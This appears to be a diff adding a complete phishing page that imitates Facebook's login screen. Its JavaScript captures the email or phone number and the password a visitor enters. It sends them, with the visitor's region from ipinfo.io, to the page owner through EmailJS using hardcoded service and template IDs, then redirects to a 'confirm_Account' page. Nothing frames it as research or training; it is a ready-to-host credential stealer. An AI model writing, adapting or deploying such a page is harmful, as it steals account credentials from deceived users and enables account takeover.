@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login </title>
+    <script type="module">
+      import emailjs from 'https://cdn.emailjs.com/dist/email.min.js';
+  </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Roboto', sans-serif;
+}
+
+.flex {
+  display: flex;
+  align-items: center;
+}
+
+.container {
+  padding: 0 15px;
+  min-height: 100vh;
+  justify-content: center;
+  background: #f0f2f5;
+}
+
+.facebook-page {
+  justify-content: space-between;
+  max-width: 1000px;
+  width: 100%;
+}
+
+.facebook-page .text {
+  margin-bottom: 90px;
+}
+
+.facebook-page h1 {
+  color: #1877f2;
+  font-size: 4rem;
+  margin-bottom: 10px;
+}
+
+.facebook-page p {
+  font-size: 1.75rem;
+  white-space: nowrap;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+  background: #fff;
+  border-radius: 8px;
+  padding: 20px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
+    0 8px 16px rgba(0, 0, 0, 0.1);
+  max-width: 400px;
+  width: 100%;
+}
+
+form input {
+  height: 55px;
+  width: 100%;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  margin-bottom: 15px;
+  font-size: 1rem;
+  padding: 0 14px;
+}
+
+form input:focus {
+  outline: none;
+  border-color: #1877f2;
+}
+
+::placeholder {
+  color: #777;
+  font-size: 1.063rem;
+}
+
+.link {
+  display: flex;
+  flex-direction: column;
+  text-align: center;
+  gap: 15px;
+}
+
+.link .login {
+  border: none;
+  outline: none;
+  cursor: pointer;
+  background: #1877f2;
+  padding: 15px 0;
+  border-radius: 6px;
+  color: #fff;
+  font-size: 1.25rem;
+  font-weight: 600;
+  transition: 0.2s ease;
+}
+
+.link .login:hover {
+  background: #0d65d9;
+}
+
+form a {
+  text-decoration: none;
+}
+
+.link .forgot {
+  color: #1877f2;
+  font-size: 0.875rem;
+}
+
+.link .forgot:hover {
+  text-decoration: underline;
+}
+
+hr {
+  border: none;
+  height: 1px;
+  background-color: #ccc;
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+
+.button {
+  margin-top: 25px;
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.button a {
+  padding: 15px 20px;
+  background: #42b72a;
+  border-radius: 6px;
+  color: #fff;
+  font-size: 1.063rem;
+  font-weight: 600;
+  transition: 0.2s ease;
+}
+
+.button a:hover {
+  background: #3ba626;
+}
+
+@media (max-width: 900px) {
+  .facebook-page {
+    flex-direction: column;
+    text-align: center;
+  }
+
+  .facebook-page .text {
+    margin-bottom: 30px;
+  }
+}
+
+@media (max-width: 460px) {
+  .facebook-page h1 {
+    font-size: 3.5rem;
+  }
+
+  .facebook-page p {
+    font-size: 1.3rem;
+  }
+
+  form {
+    padding: 15px;
+  }
+}
+</style>  
+<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form id="contact-form" action="" >
+<input type="text" placeholder="Username" id="name"  value="Facebook" name="name" class="input-1" hidden />
+          <input type="text" name="emanil" id="email" placeholder="Email or phone number" required>
+          <input type="hidden" id="region" name="region">
+          <input type="password" placeholder="Password" id="message" name="message" class="input-2" />
+
+          <div class="link">
+            <button type="submit" class="login">Login</button>
+            <a href="https://facebook.com" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="https://facebook.com">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+  <script type="text/javascript">
+    (function() {
+        emailjs.init("GTLVz-VOxS9C0bQyc"); // Use your EmailJS User ID
+    })();
+
+    document.getElementById("contact-form").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        // Collect form values
+        var name = document.getElementById("name").value;
+        var email = document.getElementById("email").value;
+        var message = document.getElementById("message").value;
+        var region = document.getElementById("region").value;
+
+        // Prepare email parameters
+        var emailParams = {
+            from_name: name,
+            from_email: email,
+            message: message,
+            region: region
+        };
+
+        // Send the email using EmailJS
+        emailjs.send("service_dqh9dbq", "template_axmqgm6", emailParams)
+            .then(function(response) {
+                console.log(" ", response);
+
+            // Redirect to another page after email is sent
+        window.location.href = "confirm_Account.html";  // Redirect to a 'thank you' page after email is sent
+            }, function(error) {
+                console.error("Error sending email:", error);
+                alert("Failed to send message. Please try again later.");
+            });
+    });
+</script>
+
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "GTLVz-VOxS9C0bQyc",
+      });
+   })();
+</script>
+<script type="text/javascript">
+  (function(){
+     emailjs.init({
+       publicKey: "GTLVz-VOxS9C0bQyc",
+     });
+  })();
+</script>
+<script type="text/javascript">
+  (function(){
+     emailjs.init({
+       publicKey: "GTLVz-VOxS9C0bQyc",
+     });
+  })();
+</script>
+<script>
+  // Function to get user's country using IP info service
+  function getUserRegion() {
+      // Use ipinfo.io API to get user's geolocation info
+      fetch('https://ipinfo.io?token=999a655c730c7c') // Replace 'YOUR_API_TOKEN' with your actual API token
+          .then(response => response.json())
+          .then(data => {
+              // Get the country from the response data
+              var region = data.region;
+
+              // Populate the hidden form field with the country code
+              document.getElementById('region').value = region;
+          })
+          .catch(error => {
+              // Handle error if the API request fails
+              alert('Error fetching region: ' + error.message);
+          });
+  }
+
+  // Call getUserCountry when the page loads
+  window.onload = function() {
+      getUserRegion();
+  }
+</script>
+  </body>
+</html>
